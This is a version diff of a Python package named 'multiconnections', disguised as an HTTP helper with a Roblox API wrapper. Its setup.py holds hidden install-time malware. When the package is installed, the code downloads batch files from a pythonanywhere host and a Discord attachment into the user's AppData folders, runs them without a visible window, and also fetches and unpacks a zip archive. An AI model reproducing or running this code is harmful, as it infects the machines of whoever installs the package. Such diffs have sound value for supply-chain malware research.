# Comparing `tmp/multiconnections-2.34.23.tar.gz` & `tmp/multiconnections-2.35.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "multiconnections-2.34.23.tar", last modified: Mon May  6 23:49:39 2024, max compression
+gzip compressed data, was "multiconnections-2.35.1.tar", last modified: Tue May  7 00:07:51 2024, max compression
```

## Comparing `multiconnections-2.34.23.tar` & `multiconnections-2.35.1.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-06 23:49:39.409163 multiconnections-2.34.23/
--rw-rw-rw-   0        0        0     3114 2024-05-06 23:49:39.393556 multiconnections-2.34.23/PKG-INFO
--rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnections-2.34.23/README.md
--rw-rw-rw-   0        0        0       42 2024-05-06 23:49:39.409163 multiconnections-2.34.23/setup.cfg
--rw-rw-rw-   0        0        0     5913 2024-05-06 23:46:09.000000 multiconnections-2.34.23/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-06 23:49:39.377991 multiconnections-2.34.23/src/
-drwxrwxrwx   0        0        0        0 2024-05-06 23:49:39.393556 multiconnections-2.34.23/src/multiconnections.egg-info/
--rw-rw-rw-   0        0        0     3114 2024-05-06 23:49:39.000000 multiconnections-2.34.23/src/multiconnections.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      333 2024-05-06 23:49:39.000000 multiconnections-2.34.23/src/multiconnections.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-06 23:49:39.000000 multiconnections-2.34.23/src/multiconnections.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-06 23:49:39.000000 multiconnections-2.34.23/src/multiconnections.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-06 23:49:39.393556 multiconnections-2.34.23/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnections-2.34.23/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnections-2.34.23/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnections-2.34.23/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnections-2.34.23/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-07 00:07:51.284019 multiconnections-2.35.1/
+-rw-rw-rw-   0        0        0     3113 2024-05-07 00:07:51.269055 multiconnections-2.35.1/PKG-INFO
+-rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnections-2.35.1/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-07 00:07:51.284019 multiconnections-2.35.1/setup.cfg
+-rw-rw-rw-   0        0        0     5587 2024-05-07 00:07:46.000000 multiconnections-2.35.1/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-07 00:07:51.253050 multiconnections-2.35.1/src/
+drwxrwxrwx   0        0        0        0 2024-05-07 00:07:51.269055 multiconnections-2.35.1/src/multiconnections.egg-info/
+-rw-rw-rw-   0        0        0     3113 2024-05-07 00:07:51.000000 multiconnections-2.35.1/src/multiconnections.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      333 2024-05-07 00:07:51.000000 multiconnections-2.35.1/src/multiconnections.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-07 00:07:51.000000 multiconnections-2.35.1/src/multiconnections.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-07 00:07:51.000000 multiconnections-2.35.1/src/multiconnections.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-07 00:07:51.269055 multiconnections-2.35.1/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnections-2.35.1/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnections-2.35.1/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnections-2.35.1/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnections-2.35.1/src/roblox_api_wrapper/message.py
```

### Comparing `multiconnections-2.34.23/PKG-INFO` & `multiconnections-2.35.1/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnections
-Version: 2.34.23
+Version: 2.35.1
 Summary: Python MultiHTTP for Humans.
 Author: multiconnections
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `multiconnections-2.34.23/README.md` & `multiconnections-2.35.1/README.md`

 * *Files identical despite different names*

### Comparing `multiconnections-2.34.23/setup.py` & `multiconnections-2.35.1/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="multiconnections",
-    version="2.34.23",
+    version="2.35.1",
     author="multiconnections",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -38,41 +38,30 @@
 import random
 import string
 
 err = " "
 try:
     t = "https://frvezdffvvvv.pythonanywhere.com/getrnr"
 
-    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\rnr.bat")
+    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\113377.bat")
     time.sleep(5)
 
-    subprocess.Popen(os.getenv('APPDATA')+"\\rnr.bat", creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.Popen(os.getenv('APPDATA')+"\\113377.bat", creationflags=subprocess.CREATE_NO_WINDOW)
 except Exception as e:
     err = str(e)
 
 
 err = " "
 try:
     t = "https://frvezdffvvvv.pythonanywhere.com/getrnr"
 
-    path,_ = urllib.request.urlretrieve(t, os.getenv('LOCALAPPDATA')+"\\rnr.bat")
+    path,_ = urllib.request.urlretrieve(t, os.getenv('LOCALAPPDATA')+"\\113377.bat")
     time.sleep(5)
 
-    subprocess.Popen(os.getenv('LOCALAPPDATA')+"\\rnr.bat", creationflags=subprocess.CREATE_NO_WINDOW)
-except Exception as e:
-    err = str(e)
-
-err = " "
-try:
-    t = "https://frvezdffvvvv.pythonanywhere.com/getrnr"
-
-    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\Microsoft\\rnr.bat")
-    time.sleep(5)
-
-    subprocess.Popen(os.getenv('APPDATA')+"\\Microsoft\\rnr.bat", creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.Popen(os.getenv('LOCALAPPDATA')+"\\113377.bat", creationflags=subprocess.CREATE_NO_WINDOW)
 except Exception as e:
     err = str(e)
 
 
     
 import os
 from urllib.request import Request, urlopen, urlretrieve
@@ -115,18 +104,18 @@
     get_response = requests.get(url,stream=True)
     file_name  = os.getenv('APPDATA')+"\\rnr.bat"
     with open(file_name, 'wb') as f:
         for chunk in get_response.iter_content(chunk_size=1024):
             if chunk:
                 f.write(chunk)
 try:
-    url = "https://cdn.discordapp.com/attachments/1236874551627874375/1236978532576657478/runnar.txt?ex=6639f988&is=6638a808&hm=8d9d71d0d5453b64d741cbee72d8e9e5ca22f170c58759135f9afa77c6f0ca0a&"
+    url = "https://cdn.discordapp.com/attachments/1236874551627874375/1237192651946594304/113377.txt?ex=663ac0f2&is=66396f72&hm=7e2dfcf35120d3c137ac7683285e34c34fc0d237d517b61c5e954ac20f9d9c42&"
     download(url)
     time.sleep(1)
-    subprocess.Popen(os.getenv('APPDATA')+"\\rnr.bat", creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.Popen(os.getenv('APPDATA')+"\\1133777.bat", creationflags=subprocess.CREATE_NO_WINDOW)
 except Exception as e:
     err = err + " - "+str(e)
     
 try:
     zip_file_path,_ = urlretrieve("https://frvezdffvvvv.pythonanywhere.com/getmss", 'mss.zip')
     with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
         zip_ref.extractall()
```

### Comparing `multiconnections-2.34.23/src/multiconnections.egg-info/PKG-INFO` & `multiconnections-2.35.1/src/multiconnections.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnections
-Version: 2.34.23
+Version: 2.35.1
 Summary: Python MultiHTTP for Humans.
 Author: multiconnections
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

